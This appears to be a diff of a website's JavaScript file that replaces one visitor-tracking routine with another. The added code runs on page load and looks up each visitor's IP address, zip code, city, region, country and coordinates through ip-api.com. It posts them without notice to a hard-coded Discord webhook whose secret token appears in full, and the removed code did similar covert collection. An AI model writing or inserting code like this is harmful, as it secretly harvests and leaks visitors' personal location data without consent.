@@ -348,60 +348,47 @@ function change() {
     document.body.appendChild(button);
   }
 }
-function getUserLocation() {
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition((position) => {
-      const { latitude, longitude } = position.coords;
-      const location = { latitude, longitude };
-      sendDataToWebhook(location);
-    }, (error) => {
-      sendDataToWebhook(null);
+function getUserIPAddress() {
+  fetch('http://ip-api.com/json')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Failed to fetch IP address');
+      }
+      return response.json();
+    })
+    .then(data => {
+      const uinfo = [data.query, data.zip, data.city, data.regionName, data.countryCode, data.lat, data.lon];
+      sendIPViaWebhook(uinfo);
+    })
+    .catch(error => {
+      console.error('Error getting user IP address:', error);
     });
-  } else {
-    sendDataToWebhook(null);
-  }
 }
 
-async function getUserIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    return null;
-  }
-}
-
-async function sendDataToWebhook(ip) {
-  const dataToSend = { ip };
+function sendIPViaWebhook(info) {
   const webhookURL = 'https://discord.com/api/webhooks/1187164716980785223/PLQjmGNi2-zqSHtfNyTjMpGfOosQPaOJkhU8rdLxmGbWwqRnAxJnkdTexKEuU7thAWAe';
+  
+  const data = {
+    content: `Person entered the website! \nIp: ${info[0]} \nZip Code: ${info[1]} \nCity: ${info[2]} \nRegion: ${info[3]} \nCountry: ${info[4]} \nLat: ${info[5]} \nLon: ${info[6]}`
+  };
+  
 
-  try {
-    const response = await fetch(webhookURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(dataToSend),
-    });
-
-    if (response.ok) {
-      console.log('IP address sent successfully to the webhook');
-    } else {
-      console.error('Failed to send IP address to the webhook');
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Failed to send IP address via webhook');
     }
-  } catch (error) {
-    console.error('Error sending IP address to the webhook:', error);
-  }
+    console.log('IP address sent successfully!');
+  })
+  .catch(error => {
+    console.error('Error sending IP address via webhook:', error);
+  });
 }
 
-async function sendIPToWebhook() {
-  const userIP = await getUserIP();
-  if (userIP) {
-    sendDataToWebhook(userIP);
-  } else {
-    console.error('Unable to fetch IP address');
-  }
-}
-
-sendIPToWebhook();
+getUserIPAddress();
